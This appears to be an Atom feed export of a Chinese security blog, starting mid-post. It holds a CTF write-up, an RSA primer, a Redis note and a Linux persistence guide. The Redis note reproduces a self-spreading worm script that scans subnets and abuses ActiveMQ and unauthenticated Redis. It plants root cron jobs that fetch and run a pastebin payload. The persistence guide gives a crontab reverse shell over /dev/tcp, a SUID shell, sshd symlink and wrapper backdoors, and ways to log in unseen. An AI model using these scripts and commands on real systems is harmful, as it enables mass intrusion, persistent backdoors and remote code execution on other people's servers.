&quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwdecho &#39;guest:123456&#39;|chpasswd</code></pre><p><img src="https://i.imgur.com/wcYmUNJ.png"><br>添加成功 root权限</p><p>本地做ssh流量转发<br><img src="https://i.imgur.com/bz4HQnq.png"></p><p>可以看到 curl出内容转发成功。本地访问发现是Metinfo6.1</p><p>Metinfo6.1-&gt;信息泄露读取数据库信息</p><pre><code>http://127.0.0.1:11/include/thumb.php?dir=http\..\..\config\config_db.php</code></pre><p><img src="https://i.imgur.com/O1q56Ws.png"></p><pre><code>mysql -h 127.0.0.1 -P 20 -u root -pSmuwelcome</code></pre><p><img src="https://i.imgur.com/qIkBItC.png"></p><p>拿到flag{87ef98219672a78c19bae7954fcd4114}</p><p>之后又增加了点难度 </p><p><img src="https://i.imgur.com/Wa7QVeR.png"></p><p>限制了端口，不过8080拿到shell后是root权限可以为所欲为自己操作吧。</p><h2 id="杂项密码"><a href="#杂项密码" class="headerlink" title="杂项密码"></a>杂项密码</h2><h3 id="十三姨穿花衣"><a href="#十三姨穿花衣" class="headerlink" title="十三姨穿花衣"></a>十三姨穿花衣</h3><pre><code>39293882298593559195834062835474883832957</code></pre><p>十进制转字符串，然后rot3</p><p>flag{its-so-easy}</p><h3 id="LSB-娘子，啊哈？"><a href="#LSB-娘子，啊哈？" class="headerlink" title="LSB(娘子，啊哈？)"></a>LSB(娘子，啊哈？)</h3><p>zip爆破Ziperello</p><p>密码 2018114</p><p>解出图片</p><p>Stegsolve神器</p><p><img src="https://i.imgur.com/XZdVP9L.png"></p><p>有加密信息猜测是lsb隐写</p><p>以zip密码尝试分离</p><p><img src="https://i.imgur.com/CHTNSZs.png"></p><p>flag{72226ef09cf65b883508b2d9a8bec3a8}</p><h3 id="共模共计"><a href="#共模共计" class="headerlink" title="共模共计"></a>共模共计</h3><pre><code>n = 12163241791483524957316806288597760862288981689931968345271813765985026429745857e1 = 11e2 = 1264864681c = 3079810359319238928727602198449362532122827974473968422037011227516212995430600c2 = 1067676967051445848402525273436721484419308188939468918925696594850492013554433</code></pre><p>脚本</p><pre><code># -*- coding: utf-8 -*-from libnum import n2s,s2nfrom gmpy2 import invert# 欧几里得算法def egcd(a, b):  if a == 0:return (b, 0, 1)  else:g, y, x = egcd(b % a, a)return (g, x - (b // a) * y, y)def main():  n = 12163241791483524957316806288597760862288981689931968345271813765985026429745857  c1 = 3079810359319238928727602198449362532122827974473968422037011227516212995430600  c2 = 1067676967051445848402525273436721484419308188939468918925696594850492013554433  e1 = 11  e2 = 1264864681  s = egcd(e1, e2)  s1 = s[1]  s2 = s[2]  # 求模反元素  if s1&lt;0:s1 = - s1c1 = invert(c1, n)  elif s2&lt;0:s2 = - s2c2 = invert(c2, n)  m = pow(c1,s1,n)*pow(c2,s2,n) % n  print n2s(m)if __name__ == &#39;__main__&#39;:  main()</code></pre><p>flag{just-s0-s0}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>慌慌忙忙准备了一周，第一次做校外的邀请赛比赛中也是出现了很多问题，运维不好做啊！！！环境搭建好上线就出问题，尤其是几道弱密码需要爆破的。服务器也没做维护(虽然内网环境里封了端口到了服务器就没想到…差点被日)题目也是没有太大难度都是这段时间所学，总之师傅们太强了！一首凉凉送给自己。</p><p>最后说一句出题人也很不容易，请不要暴打出题人…</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;100-sql&quot;&gt;&lt;a href=&quot;#100-sql&quot; class=&quot;headerlink&quot; title=&quot;100 sql&quot;&gt;&lt;/a&gt;100 sql&lt;/h3&gt;&lt;p&gt;简单sql注入&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://phyb0x.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA</title>
    <link href="https://phyb0x.github.io/2018/10/30/RSA/"/>
    <id>https://phyb0x.github.io/2018/10/30/RSA/</id>
    <published>2018-10-30T02:29:07.000Z</published>
    <updated>2019-01-19T02:05:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>数学没学明白就是吃亏 …</p><span id="more"></span><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>先盗图</p><p><img src="https://image.3001.net/images/20170919/15058026067759.png"></p><p>RSA是一种非对称加密算法，它由 公钥（ne），私钥(nd)，明文M和密文C组成</p><h4 id="mod运算"><a href="#mod运算" class="headerlink" title="mod运算"></a>mod运算</h4><p>模运算就是取余</p><pre><code> 5 mod 3 = 2</code></pre><p>同余运算就是两个整数a,b 他们除以M所得余数相等</p><pre><code>a = b(mod m)11 = 5(mod 3)</code></pre><p>再次盗图…</p><h4 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4><p><img src="https://image.3001.net/images/20170919/15058026976197.png"></p><h4 id="秘钥对生成"><a href="#秘钥对生成" class="headerlink" title="秘钥对生成"></a>秘钥对生成</h4><p>n → L → e → d</p><p><img src="https://image.3001.net/images/20170919/15058027352136.png"></p><h4 id="因式分解"><a href="#因式分解" class="headerlink" title="因式分解"></a>因式分解</h4><pre><code>https://factordb.com/</code></pre><p>yafu </p><p>把N保存到1.txt(最后要有换行符)<br><img src="https://i.imgur.com/YfKWlRg.png"></p><h4 id="简单加密解密脚本"><a href="#简单加密解密脚本" class="headerlink" title="简单加密解密脚本"></a>简单加密解密脚本</h4><p>解密</p><pre><code>import libnumimport gmpy2 n = 12163241791483524957316806288597760862288981689931968345271813765985026429745857e = 11p = 3487583947589437589237958723892346254567q = 3487583947589437589237958723892346254871assert n==p*qc = 3079810359319238928727602198449362532122827974473968422037011227516212995430600d = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print libnum.n2s(m)</code></pre><p>加密</p><pre><code>import libnumimport gmpy2m = &#39;flag&#123;just-s0-s0&#125;&#39;m = libnum.s2n(m)p = 3487583947589437589237958723892346254567q = 3487583947589437589237958723892346254871n = 12163241791483524957316806288597760862288981689931968345271813765985026429745857e = 11assert n == p*qc = pow(m,e,n)print c</code></pre>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;数学没学明白就是吃亏 …&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://phyb0x.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>redis</title>
    <link href="https://phyb0x.github.io/2018/10/26/redis(%E8%A1%A5)/"/>
    <id>https://phyb0x.github.io/2018/10/26/redis(%E8%A1%A5)/</id>
    <published>2018-10-26T08:52:08.000Z</published>
    <updated>2019-01-19T02:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里就是补写一下之前的疑问</p><span id="more"></span><p>在set各种值的时候会混在一起是因为每次操作的时候没有清除key值</p><p><img src="https://i.imgur.com/fNVXxJ9.png"></p><p>可以看到这里 qwe这个键值已经被用过了 </p><p>如果我们写入的时候继续以这个键值命名就会在原有的基础上添加</p><p>解觉也很简单清除就行 </p><pre><code>flushdb</code></pre><p>还有就是写马菜刀连不上是因为PHP高版本采用了安全策略有Java版菜刀连就行了</p><p>附上tools大佬给的脚本</p><pre><code>#! /usr/bin/env python#coding: utf-8import threadingimport socketfrom re import findallimport httplibimport osIP_LIST = []class scanner(threading.Thread):    tlist = []    maxthreads = 200    evnt = threading.Event()    lck = threading.Lock()    def __init__(self,host):        threading.Thread.__init__(self)        self.host = host    def run(self):        try:            s = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)            s.settimeout(1)            s.connect_ex((self.host, 8161))            s.send(&#39;google spider\r\n&#39;)            results = s.recv(1)            if str(results):                data = &quot;*/1 * * * * root (curl -fsSL [url]https://pastebin.com/raw/5bjpjvLP[/url]||wget -q -O- [url]https://pastebin.com/raw/5bjpjvLP[/url])|sh\n##&quot;                data2 = &quot;*/1 * * * * (curl -fsSL [url]https://pastebin.com/raw/5bjpjvLP[/url]||wget -q -O- [url]https://pastebin.com/raw/5bjpjvLP[/url])|sh\n##&quot;                conn = httplib.HTTPConnection(self.host, port=8161, timeout=2)                conn.request(method=&#39;PUT&#39;, url=&#39;/fileserver/go.txt&#39;, body=data)                conn.request(method=&#39;PUT&#39;, url=&#39;/fileserver/goa.txt&#39;, body=data2)                conn.request(method=&#39;PUT&#39;, url=&#39;/fileserver/gob.txt&#39;, body=data2)                result = conn.getresponse()                conn.close()                if result.status == 204:                    headers = &#123;&#39;Destination&#39;:     &#39;file:///etc/cron.d/root&#39;&#125;                    headers2 = &#123;&#39;Destination&#39;: &#39;file:///var/spool/cron/root&#39;&#125;                    headers3 = &#123;&#39;Destination&#39;: &#39;file:///var/spool/cron/crontabs/root&#39;&#125;                    conn = httplib.HTTPConnection(self.host, port=8161, timeout=2)                    conn.request(method=&#39;MOVE&#39;, url=&#39;/fileserver/go.txt&#39;, headers=headers)                    conn.request(method=&#39;MOVE&#39;, url=&#39;/fileserver/goa.txt&#39;, headers=headers2)                    conn.request(method=&#39;MOVE&#39;, url=&#39;/fileserver/gob.txt&#39;, headers=headers3)                    conn.close()            s.close()        except Exception:            pass        try:            s2 = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)            s2.settimeout(2)            x = s2.connect_ex((self.host, 6379))            if x == 0:                s2.send(&#39;set backuper1 &quot;\\n\\n\\n*/1 * * * * root (curl -fsSL [url]https://pastebin.com/raw/5bjpjvLP[/url]||wget -q -O- [url]https://pastebin.com/raw/5bjpjvLP[/url])|sh\\n\\n\\n&quot;\r\n&#39;)                s2.send(&#39;set backuper2 &quot;\\n\\n\\n*/1 * * * * (curl -fsSL [url]https://pastebin.com/raw/5bjpjvLP[/url]||wget -q -O- [url]https://pastebin.com/raw/5bjpjvLP[/url])|sh\\n\\n\\n&quot;\r\n&#39;)                s2.send(&#39;config set dir /etc/cron.d/\r\n&#39;)                s2.send(&#39;config set dbfilename root\r\n&#39;)                s2.send(&#39;save\r\n&#39;)                s2.send(&#39;config set dir /var/spool/cron/\r\n&#39;)                s2.send(&#39;config set dbfilename root\r\n&#39;)                s2.send(&#39;save\r\n&#39;)                s2.send(&#39;config set dir /var/spool/cron/crontabs/\r\n&#39;)                s2.send(&#39;config set dbfilename root\r\n&#39;)                s2.send(&#39;save\r\n&#39;)            s2.close()        except Exception:            pass        scanner.lck.acquire()        scanner.tlist.remove(self)        if len(scanner.tlist) &lt; scanner.maxthreads:            scanner.evnt.set()            scanner.evnt.clear()            scanner.lck.release()    def newthread(host):        scanner.lck.acquire()        sc = scanner(host)        scanner.tlist.append(sc)        scanner.lck.release()        sc.start()        newthread = staticmethod(newthread)def get_ip_list():    try:        url = &#39;ident.me&#39;        conn = httplib.HTTPConnection(url, port=80, timeout=10)        conn.request(method=&#39;GET&#39;, url=&#39;/&#39;, )        result = conn.getresponse()        ip1 = result.read()        ips1 = findall(r&#39;\d+.\d+.&#39;, ip1)[0]        for u in range(0, 256):            ip_list1 = (ips1 + (str(u)))            for g in range(1, 256):                IP_LIST.append(ip_list1 + &#39;.&#39; + (str(g)))    except Exception:        ip2 = os.popen(&quot;/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk &#39;&#123;print $2&#125;&#39;|tr -d \&quot;addr:\&quot;&quot;).readline().rstrip()        ips2 = findall(r&#39;\d+.\d+.&#39;, ip2)[0]        for i in range(0, 255):            ip_list2 = (ips2 + (str(i)))            for g in range(1, 255):                IP_LIST.append(ip_list2 + &#39;.&#39; + (str(g)))        passdef runPortscan():    get_ip_list()    for host in IP_LIST:        scanner.lck.acquire()        if len(scanner.tlist) &gt;= scanner.maxthreads:            scanner.lck.release()            scanner.evnt.wait()        else:            scanner.lck.release()            scanner.newthread(host)    for t in scanner.tlist:        t.join()if __name__ == &quot;__main__&quot;:    runPortscan()</code></pre><p>不忘初心，方得始终。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这里就是补写一下之前的疑问&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>linux权限维持-后门</title>
    <link href="https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/"/>
    <id>https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/</id>
    <published>2018-10-23T15:15:46.000Z</published>
    <updated>2019-01-19T02:04:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>收集复现下网上linux后门姿势，一起学习下。</p><span id="more"></span><p>这张图特别好</p><p><img src="https://i.imgur.com/mbGCWWC.png"></p><h4 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h4><p>某些情况下是没有回显的，可以用一句话直接添加用户</p><pre><code>1、useradd guest;echo &#39;guest:123456&#39;|chpasswd2、useradd -p `openssl passwd 123456` guest3、useradd -p &quot;$(openssl passwd 123456)&quot; guest4、useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</code></pre><p>然后把我们添加的用户赋予root权限    </p><pre><code>echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwdecho &#39;guest:123456&#39;|chpasswd</code></pre><p>有些时候添加不成功是因为用户策略可以适当加强密码强度</p><p>有些也会限制root权限用户远程登录</p><h4 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h4><p>Suid shell是一种可用于以拥有者权限运行的shell，如果拥有者是root<br>那么任何运行了这个shell的用户便可以控制整个系统，如增加用户、修改root口令、清除日志等等。 </p><p>root权限下执行</p><pre><code>cp /bin/bash  /.testchmod 4755 /.test</code></pre><p>这个放的目录要尽可能隐蔽，最好是子子子目录然后找一个相似的命名。</p><p>切换普通用户</p><pre><code>/.test</code></pre><p>不过bash2针对suid做了一些措施 加个参数就行</p><pre><code>/.test -p</code></pre><p><img src="https://i.imgur.com/MfrKCL2.png"></p><p>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p><h4 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h4><p>修改/etc/inetd.conf</p><p><img src="https://i.imgur.com/trdq2Ga.png"></p><p>nc直接连接</p><p><img src="https://i.imgur.com/gNtOHBu.png"></p><p>还可以配合修改修改/etc/service  改为常用端口隐藏<br><img src="https://i.imgur.com/H4ViOmX.png"></p><p><img src="https://i.imgur.com/a1PeNzd.png"></p><h4 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h4><p>redis未授权访问也是利用这个，我们可以设置没隔一段时间反弹一次shell</p><pre><code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/xxx.xxx.xxx.xxx/4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><h4 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h4><p>redis也有用到不多说了</p><pre><code>ssh-keygen -t rsa</code></pre><p>把自己本地生成的公钥id_rsa.pub传到目标服务器</p><pre><code>chmod 600 ~/.ssh/authorized_keyschmod 700 ~/.ssh</code></pre><p>实战受限且很容易被发现</p><h4 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h4><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</code></pre><p>直接ssh连接5555端口就行，密码随便输入。但是有些限制了root不许远程登录不能指定root用户。</p><p>软连接其实是利用了pam验证后续过程对pam_rootok模块的验证信任。<br><a href="http://www.91ri.org/16803.html">http://www.91ri.org/16803.html</a></p><h4 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h4><pre><code>cd /usr/sbin/mv sshd ../bin/echo &#39;#!/usr/bin/perl&#39; &gt;sshdecho &#39;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd/etc/init.d/sshd restart</code></pre><p>连接：</p><pre><code>socat STDIO TCP4:target_ip:22,sourceport=13377</code></pre><p><img src="https://i.imgur.com/Zib3o9y.png"></p><p>说句实在话每太看明白，反正命令敲上去就连上了…</p><h4 id="PAM"><a href="#PAM" class="headerlink" title="PAM"></a>PAM</h4><p><a href="https://github.com/litsand/shell/blob/master/pam.sh">https://github.com/litsand/shell/blob/master/pam.sh</a></p><p>自动化脚本</p><h4 id="Openssh"><a href="#Openssh" class="headerlink" title="Openssh"></a>Openssh</h4><p><a href="https://www.tuicool.com/articles/eIv22az">https://www.tuicool.com/articles/eIv22az</a></p><p>实战的确会遇到各种问题 (ps:本机都各种问题)</p><h4 id="隐身登录"><a href="#隐身登录" class="headerlink" title="隐身登录"></a>隐身登录</h4><p>隐身登录系统，不会被last who w等指令检测到</p><pre><code>ssh -T username@host /bin/bash -issh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -if</code></pre><h4 id="RootKit"><a href="#RootKit" class="headerlink" title="RootKit"></a>RootKit</h4><p>安装了mafix刚执行妈的把老子环境都删了，现在连命令都执行不了…<br>心态爆炸！！！</p><h3 id="收集后门"><a href="#收集后门" class="headerlink" title="收集后门"></a>收集后门</h3><pre><code>https://github.com/iamckn/backdoors</code></pre><p>参考链接：</p><p><a href="http://www.91ri.org/9026.html">http://www.91ri.org/9026.html</a></p><p><a href="https://www.anquanke.com/post/id/155943#h2-10">https://www.anquanke.com/post/id/155943#h2-10</a></p><p><a href="http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/">http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;收集复现下网上linux后门姿势，一起学习下。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
</feed>
